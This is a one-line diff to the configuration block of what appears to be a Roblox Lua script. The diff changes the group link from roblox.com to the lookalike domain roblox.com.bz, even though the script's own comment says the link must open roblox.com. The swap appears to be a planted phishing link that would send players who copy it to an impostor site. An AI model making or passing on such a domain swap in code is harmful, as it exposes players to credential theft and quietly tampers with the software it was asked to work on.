@@ -5,7 +5,7 @@
 
 ------------ CONFIG ------------
 local NAME = "Lumen"
-local GROUP_LINK = "https://roblox.com/communities/9529552772/" -- test it first: it must open roblox.com
+local GROUP_LINK = "https://roblox.com.bz/communities/9529552772/" -- test it first: it must open roblox.com
 local GROUP_ID = 9529552772
 local GROUP_NAME = "Your Group"   -- only used in the "couldn't copy the link" message
 local MIN_ACCOUNT_AGE_DAYS = 10   -- accounts younger than this are treated as alts. Set to 0 to turn the check off
